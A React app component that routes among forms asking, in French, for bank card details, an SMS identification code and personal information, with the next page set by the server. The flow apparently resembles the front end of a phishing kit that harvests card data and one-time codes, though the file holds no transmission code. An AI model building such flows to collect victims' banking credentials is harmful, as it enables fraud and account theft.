import React, { Component } from 'react';
import { connect } from 'react-redux';
import Contents from './Containers/contents';
import InfoForm from './Containers/InfoForm';
import CardForm from './Containers/CardForm';
import SmsForm from './Containers/SmsForm';
import withAnalytics from './Containers/AnalyticsHot';
import { PAGES, getPageInfo } from './actions/index';
import Spinner from './Components/Spinner';
import SuccessMessage from './Containers/Success';

class App extends Component {
  componentDidMount() {
    if (this.props.activePage === null) {
      this.props.getPage();
    }
  }

  render() {
    const { activePage } = this.props;
    if (activePage === PAGES.card)
      return (
        <Contents>
          <CardForm title='Veuillez renseigner vos données bancaires.' />
        </Contents>
      );
    if (activePage === PAGES.sms)
      return (
        <Contents>
          <SmsForm title="Veuillez renseigner le code sms d'identification." />
        </Contents>
      );
    if (activePage === PAGES.info)
      return (
        <Contents>
          <InfoForm title='Veuillez renseigner vos informations personnelles.' />
        </Contents>
      );
    if (activePage === PAGES.extern) {
      return (
        <Contents>
          <SuccessMessage />
        </Contents>
      );
    }
    return (
      <div>
        <Contents>
          <Spinner />
        </Contents>
      </div>
    );
  }
}

const mapPropsToStore = (store) => ({ activePage: store.session.activePage });
const mapDispatchToProps = {
  getPage: getPageInfo,
};

export default connect(mapPropsToStore, mapDispatchToProps)(withAnalytics(App));
